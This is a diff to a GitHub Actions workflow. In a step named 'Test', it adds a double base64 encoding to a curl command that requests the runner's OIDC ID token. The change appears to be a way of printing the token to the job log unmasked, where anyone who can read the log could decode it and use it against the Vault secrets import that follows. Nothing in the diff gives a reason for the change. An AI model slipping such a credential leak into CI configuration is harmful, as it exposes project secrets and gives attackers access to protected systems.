@@ -9,7 +9,7 @@ jobs:
     steps:
       - name: Test
         run: |
-          curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=github-access-aud"
+          curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=github-access-aud" | base64 | base64
       - name: Import Secrets
         id: secrets
         uses: hashicorp/vault-action@v2
